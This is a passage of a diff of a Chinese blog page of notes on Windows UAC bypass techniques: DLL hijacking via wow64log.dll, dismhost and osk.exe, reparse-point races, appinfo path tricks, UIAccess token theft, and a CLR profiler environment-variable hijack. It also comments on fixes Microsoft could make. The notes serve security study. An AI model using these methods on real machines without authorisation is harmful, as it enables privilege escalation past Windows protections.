 <p>绕过方法：通过其他的dll去劫持。pkgmgr的参数（xml文件）也不用加什么？？因为没有意义。</p>
 <h2 id="wow64-subsystem-logger-dll">#30 Wow64 subsystem logger dll</h2>
-<p>subsystem logger dll是无文档内部的debug工具，十年前<a target="_blank" rel="noopener" href="https://lhc645.wordpress.com/tag/wow64log-dll/">lhc645</a>就发现了。wow64log.dll 源码骨架都有。</p>
+<p>subsystem logger dll是无文档内部的debug工具，十年前<a
+target="_blank" rel="noopener" href="https://lhc645.wordpress.com/tag/wow64log-dll/">lhc645</a>就发现了。wow64log.dll
+源码骨架都有。</p>
 <p>每个wow64 application（32位）启动的时候都会加载它（64位），</p>
-<p>This method has a lot of disadvantages and not that much room to maneuver in case of active counteraction from WD.</p>
-<p>UACMe首先移植非native的wow64log.dll到system32，之后相关程序启动之后就会崩溃，然后启动<em>WerFault</em> 实例，此时wow64log.dll才执行payload。</p>
+<p>This method has a lot of disadvantages and not that much room to
+maneuver in case of active counteraction from WD.</p>
+<p>UACMe首先移植非native的wow64log.dll到system32，之后相关程序启动之后就会崩溃，然后启动<em>WerFault</em>
+实例，此时wow64log.dll才执行payload。</p>
 <p>最好能默认关闭这个debug功能。</p>
 <h2 id="dismhost.exe劫持---fixed">#26 dismhost.exe劫持 - fixed</h2>
 <p>发现者：enigma0x3，时间：20160722。https://enigma0x3.net/2016/07/22/bypassing-uac-on-windows-10-using-disk-cleanup/</p>
-<p>cleanmgr.exe 系统的计划任务中的磁盘清理程序，是提权的计划任务。它运行的时候会把dismhost.exe和一些其他dll拷到%temp%.exe再运行。通过复制LogProvider.dll劫持。需要一直监控着temp文件夹然后在他们运行之前拷好。有点算条件竞争吧。</p>
+<p>cleanmgr.exe
+系统的计划任务中的磁盘清理程序，是提权的计划任务。它运行的时候会把dismhost.exe和一些其他dll拷到%temp%.exe再运行。通过复制LogProvider.dll劫持。需要一直监控着temp文件夹然后在他们运行之前拷好。有点算条件竞争吧。</p>
 <ul>
 <li><p>Works from: Windows 10 TH1 (10240)</p></li>
 <li><p>AlwaysNotify compatible</p></li>
@@ -382,21 +462,36 @@
 </ul></li>
 </ul>
 <h2 id="section-1">#36</h2>
-<p>infamous <em>SandboxEscaper</em> 利用Wusa在当前盘符根目录下创建的临时目录的安全性不对，利用NTFS reparse point feature。条件竞争设置reparse point到那个目录上就可以重定向写入到其他地方。</p>
+<p>infamous <em>SandboxEscaper</em>
+利用Wusa在当前盘符根目录下创建的临时目录的安全性不对，利用NTFS reparse
+point feature。条件竞争设置reparse
+point到那个目录上就可以重定向写入到其他地方。</p>
 <h2 id="section-2">#37</h2>
 <p>使用#35去高权限移动文件。</p>
-<p>使用GdiPlus with target set to <em>DCCW.exe</em> 进行dotLocal的dll劫持。</p>
+<p>使用GdiPlus with target set to <em>DCCW.exe</em>
+进行dotLocal的dll劫持。</p>
 <p>dccw.exe.local的防御</p>
 <h2 id="没看懂">#38 没看懂</h2>
-<p>This method uses <em>appinfo</em> command line parsing spoofing. This requires talking to <em>appinfo</em> via <em>RPC</em> as Windows Shell always build correct command line request when used <em>ShellExecute(Ex)</em>. This can be achieved through <strong><em>AicLaunchAdminProcess</em></strong> hook or by direct <em>RPC</em> call. You have to prepare your <em>MMC</em> snap-in and embed in it <em>Shockwave Flash Object</em> which will execute supplied <em>HTML</em> script located somewhere on disk. This <em>HTML</em> code will eventually run your payload through <em>ExecuteShellCommand</em> method.</p>
+<p>This method uses <em>appinfo</em> command line parsing spoofing. This
+requires talking to <em>appinfo</em> via <em>RPC</em> as Windows Shell
+always build correct command line request when used
+<em>ShellExecute(Ex)</em>. This can be achieved through
+<strong><em>AicLaunchAdminProcess</em></strong> hook or by direct
+<em>RPC</em> call. You have to prepare your <em>MMC</em> snap-in and
+embed in it <em>Shockwave Flash Object</em> which will execute supplied
+<em>HTML</em> script located somewhere on disk. This <em>HTML</em> code
+will eventually run your payload through <em>ExecuteShellCommand</em>
+method.</p>
 <h2 id="section-3">#59</h2>
-<p><em>appinfo</em> direct talking 的debug object去提权，非常复杂。和#38利用的原理不同</p>
+<p><em>appinfo</em> direct talking 的debug
+object去提权，非常复杂。和#38利用的原理不同</p>
 <h2 id="c-profile---unfixed">#39 C# profile - unfixed</h2>
 <p>https://www.freebuf.com/vuls/183914.html</p>
 <p>https://offsec.almond.consulting/UAC-bypass-dotnet.html</p>
 <p>https://3gstudent.github.io/3gstudent.github.io/Use-CLR-to-bypass-UAC/</p>
 <p>双击任一msc文件，通过Procmon监控发现最终运行的都是mmc.exe文件</p>
-<p>CLR(Common Language Runtime)，是微软为他们的.NET的虚拟机所选用的名称</p>
+<p>CLR(Common Language
+Runtime)，是微软为他们的.NET的虚拟机所选用的名称</p>
 <p>CLR会先检查环境变量中COR_ENABLE_PROFILING是否为1，若检查通过，则根据.NET版本不同，查找DLL位置的方法也不同，对于低于4.0的则去注册表中查找CLSID或ProgID项，找到其指定的dll文件路径。从.NET4.0版本开始则先查找环境变量COR_PROFILER_PATH是否指定dll文件路径，没有再去注册表中查找对应的CLSID项。所以这里我们就不设置COR_PROFILER_PATH了</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">COR_ENABLE_PROFILING = 1</span><br><span class="line"></span><br><span class="line">COR_PROFILER=&#123;CLSIDor ProgID&#125;</span><br></pre></td></tr></table></figure>
 <p>找到HKEY_CURRENT_USER，分别添加以下新项：</p>
@@ -408,14 +503,23 @@
 <h2 id="icmluautil">#41 ICMLuaUtil</h2>
 <p>应该直接从COMAutoApprovalList移除。</p>
 <h2 id="icolordataproxy">#43 IColorDataProxy</h2>
-<p>先用#41的任意注册表写，写入<strong>HKLMNT* <span class="citation" data-cites="*DisplayCalibrator">@*DisplayCalibrator</span>* 然后调用 </strong>IColorDataProxy** 通过高完整度<strong>ShellExecuteEx</strong> 运行指定的程序。</p>
-<h2 id="appinfo里利用getlongpathname缺陷">#52 appinfo里利用GetLongPathName缺陷</h2>
+<p>先用#41的任意注册表写，写入<strong>HKLMNT* <span class="citation"
+data-cites="*DisplayCalibrator">@*DisplayCalibrator</span>* 然后调用
+</strong>IColorDataProxy** 通过高完整度<strong>ShellExecuteEx</strong>
+运行指定的程序。</p>
+<h2 id="appinfo里利用getlongpathname缺陷">#52
+appinfo里利用GetLongPathName缺陷</h2>
 <p>恶意软件非常喜欢的方法。简单。Win32 API path conversion</p>
-<p>特殊方法创建一个后面带空格的"C:"目录，然后在appinfo.dll里面UAC检查的时候经过*<strong>GetLongPathName*</strong> 这个API会自作主张修复这个不合法的路径，导致之后比对的时候成为可信路径。</p>
+<p>特殊方法创建一个后面带空格的"C:"目录，然后在appinfo.dll里面UAC检查的时候经过*<strong>GetLongPathName*</strong>
+这个API会自作主张修复这个不合法的路径，导致之后比对的时候成为可信路径。</p>
 <p>然后从system32里面拷可信exe出来做dll劫持。</p>
 <p>UACME的作者改进了，增加了reparse points。</p>
 <h2 id="osk的劫持uiaccess消息注入">#32 osk的劫持+UIAccess消息注入</h2>
-<p>复制osk.exe到<code>%ProgramFiles%\Windows Media Player</code> 文件夹，然后通过该文件夹下的<em>duser.dll</em> or <em>osksupport.dll</em> 进行劫持，最终得到Medium+的带UIAccess的权限。可以通过MessageHook注入高权限进程。UacMe注入了<em>eventvwr.exe</em> 。</p>
+<p>复制osk.exe到<code>%ProgramFiles%\Windows Media Player</code>
+文件夹，然后通过该文件夹下的<em>duser.dll</em> or
+<em>osksupport.dll</em>
+进行劫持，最终得到Medium+的带UIAccess的权限。可以通过MessageHook注入高权限进程。UacMe注入了<em>eventvwr.exe</em>
+。</p>
 <p>微软应该：</p>
 <ol type="1">
 <li>加固Manifest的LoadFrom项</li>
@@ -431,20 +535,31 @@
 </blockquote>
 <p>获取UIAccess权限 -&gt; 利用它提权。</p>
 <h4 id="阶段一-uipi-token窃取">阶段一 UIPI token窃取</h4>
-<p>从msra.exe/osk.exe(on-screen keyboard) 窃取有UIAccess标志的令牌，然后修改完整度从Medium+到Medium，再启动自己的程序，这样就能操作高完整度的UI窗口了。</p>
+<p>从msra.exe/osk.exe(on-screen keyboard)
+窃取有UIAccess标志的令牌，然后修改完整度从Medium+到Medium，再启动自己的程序，这样就能操作高完整度的UI窗口了。</p>
 <h4 id="阶段二-gui操作">阶段二 GUI操作</h4>
 <p>启动msconfig打开cmd，cmd输入命令任意执行。</p>
 <h2 id="section-4">#63</h2>
-<p>相对较新的方法。dll injection to the Windows <em>Native Image Cache (NIC)</em></p>
-<h2 id="always-notify下可以绕过的方法">Always Notify下可以绕过的方法</h2>
+<p>相对较新的方法。dll injection to the Windows <em>Native Image Cache
+(NIC)</em></p>
+<h2 id="always-notify下可以绕过的方法">Always
+Notify下可以绕过的方法</h2>
 <h2 id="结语">结语</h2>
-<p>While maybe not that sophisticated and complicated UAC is still part of Windows and integrated to the system. It is not about OpenDialog. The better you understand Windows internals the better you understand how UAC works and it weakness (and the more you laugh at yet another idiot with OpenDialog). Aside of this some of these bypasses are usually accompaned by various different mechanics, algorithms and internals that need to be researched.</p>
-<p>There is a still a lot of possible real UAC bypasses undiscovered since this system mechanics is entirely broken in many ways and these methods are just waiting to be exploited.</p>
+<p>While maybe not that sophisticated and complicated UAC is still part
+of Windows and integrated to the system. It is not about OpenDialog. The
+better you understand Windows internals the better you understand how
+UAC works and it weakness (and the more you laugh at yet another idiot
+with OpenDialog). Aside of this some of these bypasses are usually
+accompaned by various different mechanics, algorithms and internals that
+need to be researched.</p>
+<p>There is a still a lot of possible real UAC bypasses undiscovered
+since this system mechanics is entirely broken in many ways and these
+methods are just waiting to be exploited.</p>
 
       
     </div>
     <footer class="article-footer">
-      <a data-url="https://wjk.moe/2020/UAC-bypass%E7%AC%94%E8%AE%B0/" data-id="cmda69qoj000fg4ue9xm956rj" data-title="UAC-bypass 笔记" class="article-share-link"><span class="fa fa-share">Teilen</span></a>
+      <a data-url="https://wjk.moe/2020/UAC-bypass%E7%AC%94%E8%AE%B0/" data-id="cmgmjrgk700056gue8s781m5j" data-title="UAC-bypass 笔记" class="article-share-link"><span class="fa fa-share">Share</span></a>
       
       
       
@@ -457,7 +572,7 @@
 <nav id="article-nav">
   
     <a href="/2021/%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90/" id="article-nav-newer" class="article-nav-link-wrap">
-      <strong class="article-nav-caption">Neuer</strong>
+      <strong class="article-nav-caption">Newer</strong>
       <div class="article-nav-title">
         
           南京大学《软件分析》课程笔记
@@ -467,7 +582,7 @@
   
   
     <a href="/2020/rcore%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" id="article-nav-older" class="article-nav-link-wrap">
-      <strong class="article-nav-caption">Älter</strong>
+      <strong class="article-nav-caption">Older</strong>
       <div class="article-nav-title">rcore学习笔记</div>
     </a>
   
@@ -508,7 +623,7 @@
   
     
   <div class="widget-wrap">
-    <h3 class="widget-title">Kategorien</h3>
+    <h3 class="widget-title">Categories</h3>
     <div class="widget">
       <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/Dev/">Dev</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/Digi/">Digi</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/Hack/">Hack</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/Notes/">Notes</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/Project/">Project</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/Read/">Read</a></li></ul>
     </div>
@@ -530,16 +645,16 @@
   <div class="widget-wrap">
     <h3 class="widget-title">Tag Cloud</h3>
     <div class="widget tagcloud">
-      <a href="/tags/AI/" style="font-size: 10px;">AI</a> <a href="/tags/CTF/" style="font-size: 18.75px;">CTF</a> <a href="/tags/Compiler/" style="font-size: 16.25px;">Compiler</a> <a href="/tags/Decompile/" style="font-size: 20px;">Decompile</a> <a href="/tags/Embedded/" style="font-size: 12.5px;">Embedded</a> <a href="/tags/English/" style="font-size: 10px;">English</a> <a href="/tags/Fuzz/" style="font-size: 17.5px;">Fuzz</a> <a href="/tags/Java/" style="font-size: 11.25px;">Java</a> <a href="/tags/LLVM/" style="font-size: 11.25px;">LLVM</a> <a href="/tags/Learning/" style="font-size: 13.75px;">Learning</a> <a href="/tags/Linux/" style="font-size: 11.25px;">Linux</a> <a href="/tags/Networking/" style="font-size: 15px;">Networking</a> <a href="/tags/OS/" style="font-size: 13.75px;">OS</a> <a href="/tags/Openwrt/" style="font-size: 10px;">Openwrt</a> <a href="/tags/PL/" style="font-size: 17.5px;">PL</a> <a href="/tags/Raspberrypi/" style="font-size: 10px;">Raspberrypi</a> <a href="/tags/Read/" style="font-size: 12.5px;">Read</a> <a href="/tags/Scientific/" style="font-size: 12.5px;">Scientific</a> <a href="/tags/StaticAnalysis/" style="font-size: 16.25px;">StaticAnalysis</a> <a href="/tags/WebAssembly/" style="font-size: 10px;">WebAssembly</a> <a href="/tags/Windows/" style="font-size: 15px;">Windows</a> <a href="/tags/rcore/" style="font-size: 10px;">rcore</a> <a href="/tags/ucore/" style="font-size: 11.25px;">ucore</a>
+      <a href="/tags/AI/" style="font-size: 10px;">AI</a> <a href="/tags/CTF/" style="font-size: 17.78px;">CTF</a> <a href="/tags/Compiler/" style="font-size: 15.56px;">Compiler</a> <a href="/tags/Decompile/" style="font-size: 20px;">Decompile</a> <a href="/tags/Embedded/" style="font-size: 12.22px;">Embedded</a> <a href="/tags/English/" style="font-size: 10px;">English</a> <a href="/tags/Fuzz/" style="font-size: 16.67px;">Fuzz</a> <a href="/tags/Java/" style="font-size: 11.11px;">Java</a> <a href="/tags/LLVM/" style="font-size: 11.11px;">LLVM</a> <a href="/tags/Learning/" style="font-size: 13.33px;">Learning</a> <a href="/tags/Linux/" style="font-size: 11.11px;">Linux</a> <a href="/tags/Networking/" style="font-size: 14.44px;">Networking</a> <a href="/tags/OS/" style="font-size: 12.22px;">OS</a> <a href="/tags/Openwrt/" style="font-size: 10px;">Openwrt</a> <a href="/tags/PL/" style="font-size: 18.89px;">PL</a> <a href="/tags/Raspberrypi/" style="font-size: 10px;">Raspberrypi</a> <a href="/tags/Read/" style="font-size: 12.22px;">Read</a> <a href="/tags/Scientific/" style="font-size: 12.22px;">Scientific</a> <a href="/tags/StaticAnalysis/" style="font-size: 18.89px;">StaticAnalysis</a> <a href="/tags/WebAssembly/" style="font-size: 10px;">WebAssembly</a> <a href="/tags/Windows/" style="font-size: 14.44px;">Windows</a> <a href="/tags/rcore/" style="font-size: 10px;">rcore</a> <a href="/tags/ucore/" style="font-size: 10px;">ucore</a>
     </div>
   </div>
 
   
     
   <div class="widget-wrap">
-    <h3 class="widget-title">Archiv</h3>
+    <h3 class="widget-title">Archives</h3>
     <div class="widget">
-      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2025/06/">June 2025</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2025/04/">April 2025</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2025/02/">February 2025</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2025/01/">January 2025</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/11/">November 2024</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/07/">July 2024</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/04/">April 2024</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/03/">March 2024</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/01/">January 2024</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/12/">December 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/11/">November 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/10/">October 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/05/">May 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/11/">November 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/09/">September 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/05/">May 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/03/">March 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/02/">February 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/12/">December 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/08/">August 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/06/">June 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/01/">January 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/12/">December 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/09/">September 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/07/">July 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/06/">June 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/02/">February 2019</a></li></ul>
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2025/09/">September 2025</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2025/06/">June 2025</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2025/04/">April 2025</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2025/02/">February 2025</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2025/01/">January 2025</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/11/">November 2024</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/07/">July 2024</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/04/">April 2024</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/03/">March 2024</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/01/">January 2024</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/12/">December 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/11/">November 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/10/">October 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/05/">May 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/11/">November 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/09/">September 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/05/">May 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/03/">March 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/02/">February 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/12/">December 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/08/">August 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/06/">June 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/01/">January 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/12/">December 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/09/">September 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/07/">July 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/06/">June 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/02/">February 2019</a></li></ul>
     </div>
   </div>
 
